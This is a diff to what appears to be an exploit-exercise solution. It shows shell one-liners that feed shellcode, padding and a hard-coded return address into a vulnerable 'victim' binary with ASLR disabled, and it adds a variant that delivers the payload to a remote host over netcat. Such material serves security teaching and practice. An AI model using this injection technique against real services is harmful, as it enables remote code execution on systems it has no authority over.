@@ -9,6 +9,11 @@ Solution
 	$ a=`printf %016x 0x7fffffffe090 | tac -rs..`
 	$ ( ( cat shellcode ; printf %080d 0 ; echo $a ) | xxd -r -p ; 	cat ) | setarch `arch` -R ./victim
 
+or
+
+	$ a=`printf %016x 0x7fffffffe090 | tac -rs..`
+	$ ( ( cat shellcode ; printf %080d 0 ; echo $a ) | xxd -r -p ;  cat ) | nc HOST PORT
+
 Shellcode
 =========
 
